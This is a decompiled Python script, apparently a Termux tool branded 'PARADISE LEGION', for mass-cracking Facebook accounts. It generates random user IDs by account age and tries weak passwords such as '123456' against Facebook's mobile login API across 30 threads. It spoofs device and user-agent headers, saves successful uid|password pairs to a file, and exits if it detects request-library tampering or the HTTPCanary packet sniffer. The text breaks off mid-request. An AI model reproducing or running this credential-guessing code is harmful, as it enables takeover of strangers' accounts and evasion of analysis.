# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

BASE_DIR = "/data/data/com.termux/files/home/storage/shared/PARADISE"
os.makedirs(BASE_DIR, exist_ok=True)

# ==========================
def save_clone(uid, pw):
    # Ambil tanggal & jam sekarang
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Nama file tetap sama (tidak pakai tanggal)
    clone_filename = "CLONE.txt"
    clone_path = os.path.join(BASE_DIR, clone_filename)

    # Simpan data + waktu
    with open(clone_path, "a") as f:
        f.write(f"{uid}|{pw}|{waktu}\n")

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


import random

def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    A = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(537,607)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Safari/{random.randint(537,607)}.36"
    B = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}) AppleWebKit/{random.randint(600,610)}.1.15 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Safari/{random.randint(600,610)}.1.15"
    C = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(530,540)}.36 (KHTML, like Gecko) Firefox/{random.randint(50,115)}.0"
    D = f"Mozilla/5.0 (Linux; Android {random.randint(6,13)}; Pixel {random.randint(2,7)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Mobile Safari/{random.randint(530,600)}.36"
    E = f"Mozilla/5.0 (iPad; CPU OS {random.randint(12,17)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.1.15 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Mobile/15E{random.randint(100,200)} Safari/{random.randint(600,610)}.1.15"
    F = f"Opera/{random.randint(60,100)}.0 (Windows NT {random.choice(['6.1','10.0'])}; Win64; x64) Presto/2.12.{random.randint(300,500)} Version/{random.randint(12,36)}.0"
    G = f"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:{random.randint(50,115)}.0) Gecko/20100101 Firefox/{random.randint(50,115)}.0"
    H = f"Mozilla/5.0 (Linux; U; Android {random.randint(5,12)}; en-us; Nexus {random.randint(4,7)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Version/{random.randint(4,10)} Mobile Safari/{random.randint(530,600)}.36"
    I = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(12,17)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.1.15 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Mobile/15E{random.randint(100,200)} Safari/{random.randint(600,610)}.1.15"
    J = f"Mozilla/5.0 (Linux; Android {random.randint(6,13)}; SM-{random.choice(['G950','G960','G970'])}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Mobile Safari/{random.randint(530,600)}.36"
    K = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Safari/{random.randint(600,610)}.36"
    L = f"Mozilla/5.0 (iPod; CPU iPhone OS {random.randint(12,17)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Mobile/15E{random.randint(100,200)} Safari/{random.randint(600,610)}.36"
    M = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.1','10.0'])}; rv:{random.randint(50,115)}.0) Gecko/20100101 Firefox/{random.randint(50,115)}.0"
    N = f"Mozilla/5.0 (Linux; Android {random.randint(7,13)}; Pixel {random.randint(2,7)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Mobile Safari/{random.randint(530,600)}.36"
    O = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)}"
    P = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Firefox/{random.randint(50,115)}.0"
    Q = f"Opera/{random.randint(60,100)}.0 (Linux; Android {random.randint(6,13)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Mobile Safari/{random.randint(530,600)}.36"
    R = f"Mozilla/5.0 (Linux; U; Android {random.randint(5,12)}; en-us; LG-{random.randint(3,7)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Version/{random.randint(4,10)} Mobile Safari/{random.randint(530,600)}.36"
    S = f"Mozilla/5.0 (Windows NT {random.choice(['6.1','10.0'])}; WOW64; rv:{random.randint(50,115)}.0) Gecko/20100101 Firefox/{random.randint(50,115)}.0"
    T = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(12,17)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Mobile/15E{random.randint(100,200)} Safari/{random.randint(600,610)}.36"
    U = f"Mozilla/5.0 (Linux; Android {random.randint(6,13)}; SM-{random.choice(['A105','A205','A305'])}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Mobile Safari/{random.randint(530,600)}.36"
    V = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Safari/{random.randint(600,610)}.36"
    W = f"Mozilla/5.0 (iPad; CPU OS {random.randint(12,17)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Version/{random.randint(12,16)}.0 Mobile/15E{random.randint(100,200)} Safari/{random.randint(600,610)}.36"
    X = f"Mozilla/5.0 (Linux; Android {random.randint(7,13)}; Pixel {random.randint(2,7)}) AppleWebKit/{random.randint(530,600)}.36 (KHTML, like Gecko) Version/{random.randint(4,10)} Mobile Safari/{random.randint(530,600)}.36"
    Y = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,5000)}.{random.randint(0,120)} Safari/537.36"
    Z = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}) AppleWebKit/{random.randint(600,610)}.36 (KHTML, like Gecko) Firefox/{random.randint(50,115)}.0"

    return random.choice([
        A,B,C,D,E,F,G,H,I,J,K,
        L,M,N,O,P,Q,R,S,T,U,V,
        W,X,Y,Z
    ])

# Set window title
sys.stdout.write('\x1b]2;𓆩【🧬 𝐑𝐀𝐉𝐄𝐒𝐇 KING🧬】𓆪 \x07')


def ____banner____():
    """
    Displays the main banner and tool information.
    """
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print("""\x1b[38;5;46m
███████╗███╗   ██╗██████╗  █████╗     \x1b[38;5;196m██╗  ██╗██████╗ 
██╔════╝████╗  ██║██╔══██╗██╔══██╗    \x1b[38;5;196m██║  ██║██╔══██╗
█████╗  ██╔██╗ ██║██████╔╝███████║    \x1b[38;5;196m███████║██████╔╝
██╔══╝  ██║╚██╗██║██╔═══╝ ██╔══██║    \x1b[38;5;196m██╔══██║██╔═══╝ 
███████╗██║ ╚████║██║     ██║  ██║    \x1b[38;5;196m██║  ██║██║     
╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝    \x1b[38;5;196m╚═╝  ╚═╝╚═╝     

\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━┫ \x1b[38;5;196mPARADISE LEGION PRIVATE TOOLS \x1b[38;5;51m┣━━━━━━━━━━━━━━━━━━━━━━━
   \x1b[38;5;196m(★)\x1b[38;5;46m VERSION   \x1b[1;37m:\x1b[38;5;51m 5.0 FINAL BUILD
   \x1b[38;5;196m(★)\x1b[38;5;46m AUTHOR    \x1b[1;37m:\x1b[38;5;51m PARADISE LEGION  | CYBER LEGION
   \x1b[38;5;196m(★)\x1b[38;5;46m GITHUB    \x1b[1;37m:\x1b[38;5;51m github.com/300CROT_DEK
   \x1b[38;5;196m(★)\x1b[38;5;46m STATUS    \x1b[1;37m:\x1b[38;5;46m ACTIVE 🔥 | MULTI-TASK MODE ⚡
   \x1b[38;5;196m(★)\x1b[38;5;46m SERVERS   \x1b[1;37m:\x1b[38;5;51m [SG] [US] [JP] [ID]  🌍
   \x1b[38;5;196m(★)\x1b[38;5;46m FEATURES  \x1b[1;37m:\x1b[38;5;51m BRUTE⚔ | API⚡ | AUTO-LOGIN🔑 | DUMP📂
   \x1b[38;5;196m(★)\x1b[38;5;46m SECURITY  \x1b[1;37m:\x1b[38;5;196m ENCRYPTED 🔒 | ANTI-DETECT 🛡️
   \x1b[38;5;196m(★)\x1b[38;5;46m USERS     \x1b[1;37m:\x1b[38;5;51m 1200+ ACTIVE 👥
   \x1b[38;5;196m(★)\x1b[38;5;46m UPDATED   \x1b[1;37m:\x1b[38;5;51m 23-NOV-2025 🗓️
\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")


def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break
 
def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        sys.stdout.write(
            f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<"
            f"\x1b[38;5;196m(\x1b[1;37m🌏PARADISE RECORD💦"
            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}"
            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mWOKEH"
            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}"
            f"\x1b[38;5;196m)"
        )
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_ID',
                'client_country_code': 'ID',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
    "User-Agent": str(random.choice([
            # Android Chrome
            "Mozilla/5.0 (Linux; Android "
            f"{random.randint(8,14)}.{random.randint(0,3)}; "
            f"{random.choice(['SM-A125F','SM-A207F','SM-M326B','SM-A146P','SM-S918B','Redmi-Note-10','Redmi-Note-11','RMX3351','Vivo-1906','OPPO-CPH1909','Realme-RMX3085','TECNO-KG5k','Infinix-X657','Pixel-6','Pixel-7','Samsung-G991B','Samsung-G998B','Mi-11','OnePlus-9'])}) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)} "
            "Mobile Safari/537.36",

            # Android Firefox
            "Mozilla/5.0 (Android "
            f"{random.randint(8,14)}.{random.randint(0,3)}; "
            f"{random.choice(['SM-A125F','SM-A207F','Redmi-Note-11','Vivo-1906','Pixel-7'])}) "
            "Gecko/20100101 Firefox/"
            f"{random.randint(90,115)}.0",

            # iPhone Safari
            "Mozilla/5.0 (iPhone; CPU iPhone OS "
            f"{random.randint(13,17)}_{random.randint(0,6)} like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            f"Version/{random.randint(12,17)}.0 Mobile/{random.choice(['15E148','16A366','17A577','18A373'])} "
            "Safari/605.1.15",

            # iPhone Chrome
            "Mozilla/5.0 (iPhone; CPU iPhone OS "
            f"{random.randint(13,17)}_{random.randint(0,6)} like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            f"CriOS/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)} "
            f"Mobile/{random.choice(['15E148','16A366','17A577','18A373'])} Safari/605.1.15",

            # iPad Safari
            "Mozilla/5.0 (iPad; CPU OS "
            f"{random.randint(13,17)}_{random.randint(0,6)} like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            f"Version/{random.randint(12,17)}.0 Mobile/{random.choice(['15E148','16A366','17A577','18A373'])} "
            "Safari/605.1.15",

            # iPad Chrome
            "Mozilla/5.0 (iPad; CPU OS "
            f"{random.randint(13,17)}_{random.randint(0,6)} like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            f"CriOS/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)} "
            f"Mobile/{random.choice(['15E148','16A366','17A577','18A373'])} Safari/605.1.15",

            # Desktop Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)} "
            "Safari/537.36",

            # Desktop Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:"
            f"{random.randint(90,115)}.0) Gecko/20100101 Firefox/{random.randint(90,115)}.0",

            # Desktop Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)} "
            "Safari/537.36 Edg/{random.randint(95,128)}.0.{random.randint(4000,6999)}.{random.randint(20,250)}"
        ])),
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "b-graph.facebook.com",
        "Accept": "application/json",
        "Accept-Language": random.choice([
            "id-ID,en-US;q=0.9",
            "en-US,en;q=0.9",
            "id-ID,id;q=0.9,en-US;q=0.8"
        ]),
        "X-FB-Net-HNI": str(random.randint(20000, 45000)),
        "X-FB-SIM-HNI": str(random.randint(20000, 45000)),
        "X-FB-Connection-Type": random.choice([
            "MOBILE.LTE", "MOBILE.HSPA", "MOBILE.HSPA+", "wifi"
        ]),
        "X-FB-HTTP-Engine": "Liger",
        "X-FB-Connection-Quality": random.choice([
            "EXCELLENT", "GOOD", "MODERATE"
        ]),
        "X-FB-Connection-Bandwidth": str(random.randint(1_000_000, 12_000_000)),
        "X-FB-Friendly-Name": random.choice([
            "authenticate", "login", "fetchData", "getProfile"
        ]),
        "X-FB-Request-Analytics-Tags": "graphservice",
        "X-FB-Client-IP": "True",
        "X-FB-Server-Cluster": "True",
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
    }

            # Kirim request login
            res = session.post(
